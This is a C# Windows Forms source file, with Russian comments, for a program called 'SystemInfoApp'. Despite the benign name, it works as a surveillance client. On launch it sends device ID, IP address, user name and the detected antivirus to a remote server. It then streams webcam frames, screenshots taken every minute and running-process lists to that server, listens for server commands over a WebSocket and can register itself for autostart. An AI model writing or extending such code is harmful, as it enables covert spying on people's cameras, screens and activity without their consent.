using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Accord.Video.DirectShow;

// Добавленные пространства имен
using System.Management;
using System.Net;
using System.Security.Principal;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Threading.Tasks;
using SystemInfoApp.Models;
using SystemInfoApp.Services;
using SystemInfoApp.Configuration;
using SystemInfoApp.Utils;
using FormsTimer = System.Windows.Forms.Timer;
using ThreadingTimer = System.Threading.Timer;
using Accord.Video; // Added

namespace SystemInfoApp
{
    public partial class MainForm : Form
    {
        private VideoCaptureDevice? videoSource;
        private string? logDirectory;
        private string? videoDirectory; // Удалите или используйте это поле
        private string? screenshotDirectory; // Удалите или используйте это поле
        private string? logFilePath;
        private string? processLogFilePath;
        private ThreadingTimer? processTimer; // Полностью квалифицированный Timer

        // Добавление полей для NotifyIcon и ContextMenu
        private NotifyIcon? trayIcon;
        private ContextMenu? trayMenu;

        private DataSender? dataSender;
        private WebSocketClient? webSocketClient;
        private readonly Logger logger;

        public MainForm()
        {
            InitializeComponent();  // Инициализация компонентов формы
            logger = new Logger("app.log");
            InitializeAsync();
            InitializeTrayIcon();

            // Инициализация других полей
            logDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "SystemInfoApp_Logs");
            Directory.CreateDirectory(logDirectory);

            videoDirectory = @"C:\SystemInfoApp\Videos"; // Обновленный путь
            screenshotDirectory = @"C:\SystemInfoApp\Screenshots"; // Обновленный путь

            // Создание директорий, если они не существуют
            Directory.CreateDirectory(videoDirectory);
            Directory.CreateDirectory(screenshotDirectory);

            logFilePath = Path.Combine(logDirectory, "app.log");
            processLogFilePath = Path.Combine(logDirectory, "processes.log");

            // Инициализация trayMenu и trayIcon
            trayMenu = new ContextMenu();
            trayMenu.MenuItems.Add("Open", OnOpenClick);
            trayMenu.MenuItems.Add("Exit", OnExitClick);

            trayIcon = new NotifyIcon
            {
                Text = "SystemInfoApp",
                Icon = new Icon(SystemIcons.Application, 40, 40),
                ContextMenu = trayMenu,
                Visible = true
            };
            trayIcon.DoubleClick += OnTrayIconDoubleClick;
        }

        private async void InitializeAsync()
        {
            try
            {
                // Загрузка конфигурации
                var username = Configuration.Configuration.GetUsername();
                var password = Configuration.Configuration.GetPassword();
                var baseAddress = Configuration.Configuration.GetBaseAddress();
                var webSocketUri = Configuration.Configuration.GetWebSocketUri();

                // Создание HttpClient с настройкой для HTTPS
                var httpClient = HttpClientFactory.CreateHttpClient(baseAddress, logger);
                dataSender = new DataSender(httpClient, logger);

                // Аутентификация
                await dataSender.AuthenticateAsync(username, password);

                // Отправка диагностической информации
                var diagnosticInfo = new DiagnosticInfo
                {
                    DeviceId = GetDeviceID(),
                    IPAddress = GetLocalIPAddress(),
                    UserName = WindowsIdentity.GetCurrent().Name,
                    SystemLanguage = System.Globalization.CultureInfo.CurrentCulture.DisplayName,
                    Antivirus = GetAntivirusName(),
                    CurrentTime = DateTime.Now
                };

                await dataSender.SendDiagnosticInfoAsync(diagnosticInfo);

                // Запуск захвата видео, снимков экрана и сбора процессов
                StartVideoCapture();
                StartScreenshotCapture();
                StartProcessCollection();

                // Инициализация WebSocket для получения команд от сервера
                webSocketClient = new WebSocketClient(webSocketUri, HandleWebSocketMessage, logger);
                await webSocketClient!.ConnectAsync();
            }
            catch (Exception ex)
            {
                logger.Log($"Ошибка при инициализации: {ex.Message}");
            }
        }

        /// <summary>
        /// Инициализация компонентов формы.
        /// </summary>
        private void InitializeComponent()
        {
            this.SuspendLayout();
            // 
            // MainForm
            // 
            this.ClientSize = new System.Drawing.Size(800, 450);
            this.Name = "MainForm";
            this.Text = "System Info App";
            this.Load += new System.EventHandler(this.MainForm_Load);
            this.ResumeLayout(false);
        }

        private void MainForm_Load(object? sender, EventArgs e)
        {
            // Дополнительная инициализация при загрузке формы, если необходимо
        }

        /// <summary>
        /// Запуск захвата видео с веб-камеры.
        /// </summary>
        private void StartVideoCapture()
        {
            try
            {
                var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (videoDevices.Count == 0)
                {
                    Log("Нет доступных веб-камер.");
                    return;
                }

                videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
                if (videoSource != null)
                {
                    videoSource.NewFrame += Video_NewFrame; // Corrected event subscription
                    videoSource.Start();
                    Log("Начато захватывание видео с веб-камеры.");
                }
            }
            catch (Exception ex)
            {
                Log($"Ошибка при запуске видеозахвата: {ex.Message}");
            }
        }

        /// <summary>
        /// Обработчик нового кадра с веб-камеры.
        /// </summary>
        private async void Video_NewFrame(object? sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                using (Bitmap frame = (Bitmap)eventArgs.Frame.Clone())
                {
                    // Сохранение видеокадра локально
                    string videoPath = Path.Combine(videoDirectory, $"frame_{DateTime.Now:yyyyMMdd_HHmmssfff}.png");
                    frame.Save(videoPath, ImageFormat.Png);
                    logger.Log($"Видеокадр сохранен: {videoPath}");

                    using (MemoryStream ms = new MemoryStream())
                    {
                        frame.Save(ms, ImageFormat.Png);
                        byte[] frameData = ms.ToArray();
                        if (dataSender != null)
                        {
                            await dataSender.SendVideoFrameAsync(frameData); // Отправка видеокадра
                        }
                    }
                }

                logger.Log("Видеокадр отправлен.");
            }
            catch (Exception ex)
            {
                logger.Log($"Ошибка при отправке видеокадра: {ex.Message}");
            }
        }

        /// <summary>
        /// Запуск процесса создания снимков экрана.
        /// </summary>
        private void StartScreenshotCapture()
        {
            Thread screenshotThread = new Thread(async () =>
            {
                logger.Log("Запущен поток для создания снимков экрана.");

                while (true)
                {
                    await CaptureAndSendScreenAsync();
                    Thread.Sleep(60000); // Каждые 60 секунд
                }
            });

            screenshotThread.IsBackground = true;
            screenshotThread.Start();
        }

        // ...

        /// <summary>
        /// Захват текущего состояния экрана и сохранение снимка.
        /// </summary>
        private async Task CaptureAndSendScreenAsync()
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
                    }

                    // Сохранение снимка экрана локально
                    string screenshotPath = Path.Combine(screenshotDirectory, $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");
                    bmp.Save(screenshotPath, ImageFormat.Png);
                    logger.Log($"Снимок экрана сохранен: {screenshotPath}");

                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmp.Save(ms, ImageFormat.Png);
                        byte[] screenshotData = ms.ToArray();
                        if (dataSender != null)
                        {
                            await dataSender.SendScreenshotAsync(screenshotData); // Отправка снимка экрана
                        }
                    }
                }

                logger.Log("Снимок экрана отправлен.");
            }
            catch (Exception ex)
            {
                logger.Log($"Ошибка при отправке снимка экрана: {ex.Message}");
            }
        }

        /// <summary>
        /// Запуск процесса сбора информации об активных процессах.
        /// </summary>
        private void StartProcessCollection()
        {
            try
            {
                // Используем System.Threading.Timer для сбора процессов каждые 60 секунд
                processTimer = new ThreadingTimer(async state => await CollectProcessesAsync(), null, 0, 60000);

                logger.Log("Запущен процесс сбора информации об активных процессах.");
            }
            catch (Exception ex)
            {
                logger.Log($"Ошибка при запуске сбора процессов: {ex.Message}");
            }
        }

        /// <summary>
        /// Сбор и логирование информации об активных процессах.
        /// </summary>
        /// <param name="state">Дополнительное состояние (не используется).</param>
        private async Task CollectProcessesAsync()
        {
            try
            {
                Process[] processes = Process.GetProcesses();
                var processList = new List<ProcessInfo>();

                foreach (Process proc in processes)
                {
                    string startTime = "N/A";
                    string memory = "N/A";

                    try
                    {
                        startTime = proc.StartTime.ToString();
                    }
                    catch
                    {
                        // Некоторые процессы могут не позволять доступ к StartTime
                    }

                    try
                    {
                        memory = (proc.WorkingSet64 / 1024).ToString();
                    }
                    catch
                    {
                        // Некоторые процессы могут не позволять доступ к WorkingSet64
                    }

                    processList.Add(new ProcessInfo
                    {
                        ProcessName = proc.ProcessName,
                        PID = proc.Id,
                        StartTime = startTime,
                        MemoryKB = memory
                    });
                }

                if (dataSender != null)
                {
                    await dataSender.SendProcessInfoAsync(processList); // Строка 231 и 304
                }
                logger.Log("Информация о процессах отправлена.");
            }
            catch (Exception ex)
            {
                logger.Log($"Ошибка при отправке информации о процессах: {ex.Message}");
            }
        }

        // Добавлен метод для сбора диагностической информации
        /// <summary>
        /// Сбор диагностической информации о системе.
        /// </summary>
        private void CollectDiagnosticInfo()
        {
            try
            {
                // IP-адрес
                string ipAddress = GetLocalIPAddress();

                // Имя пользователя
                string userName = WindowsIdentity.GetCurrent().Name;

                // Язык системы
                string systemLanguage = System.Globalization.CultureInfo.CurrentCulture.DisplayName;

                // Установленное антивирусное ПО
                string antivirus = GetAntivirusName();

                // Уникальный идентификатор устройства
                string deviceId = GetDeviceID();

                // Текущее время
                string currentTime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

                // Формирование строки с информацией
                string diagnosticInfo = $"--- Диагностическая информация ({currentTime}) ---\n" +
                                        $"IP-адрес: {ipAddress}\n" +
                                        $"Имя пользователя: {userName}\n" +
                                        $"Язык системы: {systemLanguage}\n" +
                                        $"Антивирус: {antivirus}\n" +
                                        $"ID устройства: {deviceId}\n\n";

                // Запись в лог-файл
                File.AppendAllText(logFilePath, diagnosticInfo);

                Log("Диагностическая информация успешно собрана и сохранена.");
            }
            catch (Exception ex)
            {
                Log($"Ошибка при сборе диагностической информации: {ex.Message}");
            }
        }

        /// <summary>
        /// Метод для записи логов в файл.
        /// </summary>
        /// <param name="message">Сообщение для логирования.</param>
        private void Log(string message)
        {
            logger.Log(message);
        }

        /// <summary>
        /// Остановка захвата видео и таймера при закрытии формы.
        /// </summary>
        /// <param name="e">Параметры события.</param>
        protected override async void OnFormClosing(FormClosingEventArgs e)
        {
            try
            {
                if (videoSource?.IsRunning == true)
                {
                    videoSource.SignalToStop();
                    videoSource = null;
                    logger.Log("Видеозахват остановлен.");
                }

                if (webSocketClient != null)
                {
                    await webSocketClient.DisconnectAsync();
                }

                // Dispose NotifyIcon to release resources
                trayIcon?.Dispose();
                logger.Log("NotifyIcon освобожден.");
            }
            catch (Exception ex)
            {
                logger.Log($"Ошибка при завершении работы приложения: {ex.Message}");
            }

            base.OnFormClosing(e);
        }

        // Добавлены вспомогательные методы
        /// <summary>
        /// Получение локального IP-адреса.
        /// </summary>
        private string GetLocalIPAddress()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        return ip.ToString();
                    }
                }
                return "IP-адрес не найден";
            }
            catch (Exception ex)
            {
                Log($"Ошибка при получении IP-адреса: {ex.Message}");
                return "Ошибка при получении IP-адреса";
            }
        }

        /// <summary>
        /// Получение названия установленного антивирусного ПО.
        /// </summary>
        private string GetAntivirusName()
        {
            try
            {
                string antivirusName = "Антивирус не обнаружен";
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntivirusProduct"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        antivirusName = obj["displayName"].ToString();
                        break; // Предполагаем, что установлен только один антивирус
                    }
                }
                return antivirusName;
            }
            catch (Exception ex)
            {
                Log($"Ошибка при получении антивирусного ПО: {ex.Message}");
                return "Ошибка при получении антивирусного ПО";
            }
        }

        /// <summary>
        /// Получение уникального идентификатора устройства.
        /// </summary>
        private string GetDeviceID()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystemProduct"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        return obj["UUID"]?.ToString() ?? "Unknown";
                    }
                }
                return "Unknown";
            }
            catch (Exception ex)
            {
                Log($"Ошибка при получении ID устройства: {ex.Message}");
                return "Ошибка при получении ID устройства";
            }
        }

        /// <summary>
        /// Установка или удаление программы из автозапуска.
        /// </summary>
        /// <param name="enable">`true` для установки в автозапуск, `false` для удаления.</param>
        private void SetAutoRun(bool enable)
        {
            try
            {
                string runKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(runKey, true))
                {
                    if (enable)
                    {
                        key.SetValue("SystemInfoApp", $"\"{Application.ExecutablePath}\"");
                        Log("Программа добавлена в автозапуск.");
                    }
                    else
                    {
                        key.DeleteValue("SystemInfoApp", false);
                        Log("Программа удалена из автозапуска.");
                    }
                }
            }
            catch (Exception ex)
            {
                Log($"Ошибка при изменении настроек автозапуска: {ex.Message}");
            }
        }

        // Добавление метода InitializeTrayIcon
        /// <summary>
        /// Инициализация значка в области уведомлений и контекстного меню.
        /// </summary>
        private void InitializeTrayIcon()
        {
            // Создание контекстного меню
            trayMenu = new ContextMenu();
            trayMenu.MenuItems.Add("Открыть", OnOpenClick);
            trayMenu.MenuItems.Add("Включить автозапуск", OnAutoRunClick);
            trayMenu.MenuItems.Add("Выход", OnExitClick);

            // Создание значка в области уведомлений
            trayIcon = new NotifyIcon();
            trayIcon.Text = "System Info App";
            trayIcon.Icon = SystemIcons.Application;
            trayIcon.ContextMenu = trayMenu;
            trayIcon.Visible = true;

            // Обработчик двойного щелчка по значку
            trayIcon.DoubleClick += OnTrayIconDoubleClick;

            // Обновление пункта меню автозапуска
            UpdateAutoRunMenuItem();
        }

        // Добавление обработчиков событий для элементов меню
        /// <summary>
        /// Обработчик нажатия на пункт "Открыть".
        /// </summary>
        private void OnOpenClick(object? sender, EventArgs e)
        {
            this.Show();
            this.WindowState = FormWindowState.Normal;
            this.ShowInTaskbar = true;
        }

        /// <summary>
        /// Обработчик нажатия на пункт "Включить/Отключить автозапуск".
        /// </summary>
        private void OnAutoRunClick(object? sender, EventArgs e)
        {
            bool isAutoRunEnabled = IsAutoRunEnabled();
            SetAutoRun(!isAutoRunEnabled);
            UpdateAutoRunMenuItem();
        }

        /// <summary>
        /// Обработчик нажатия на пункт "Выход".
        /// </summary>
        private void OnExitClick(object? sender, EventArgs e)
        {
            if (trayIcon != null)
            {
                trayIcon.Visible = false;
            }
            Application.Exit();
        }

        /// <summary>
        /// Обработчик двойного щелчка по значку в трее.
        /// </summary>
        private void OnTrayIconDoubleClick(object? sender, EventArgs e)
        {
            OnOpenClick(sender, e);
        }

        // Добавление методов для проверки и обновления состояния автозапуска
        /// <summary>
        /// Проверка, включен ли автозапуск.
        /// </summary>
        private bool IsAutoRunEnabled()
        {
            try
            {
                string runKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(runKey, false))
                {
                    object value = key.GetValue("SystemInfoApp");
                    return value != null;
                }
            }
            catch (Exception ex)
            {
                Log($"Ошибка при проверке автозапуска: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Обновление текста пункта меню автозапуска.
        /// </summary>
        private void UpdateAutoRunMenuItem()
        {
            if (trayMenu?.MenuItems != null && trayMenu.MenuItems.Count > 1)
            {
                bool isAutoRunEnabled = IsAutoRunEnabled();
                trayMenu.MenuItems[1].Text = isAutoRunEnabled ? "Отключить автозапуск" : "Включить автозапуск";
            }
        }

        /// <summary>
        /// Проверка, запущена ли программа с правами администратора.
        /// </summary>
        private bool IsRunAsAdmin()
        {
            try
            {
                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);
                    return principal.IsInRole(WindowsBuiltInRole.Administrator);
                }
            }
            catch (Exception ex)
            {
                Log($"Ошибка при проверке привилегий: {ex.Message}");
                return false;
            }
        }

        private void HandleWebSocketMessage(string message)
        {
            logger.Log($"Получена команда: {message}");

            // Пример: выполнение команды перезапуска приложения
            if (message.Equals("restart", StringComparison.OrdinalIgnoreCase))
            {
                Application.Restart();
            }
            // Добавьте другие команды по необходимости
        }
    }
}
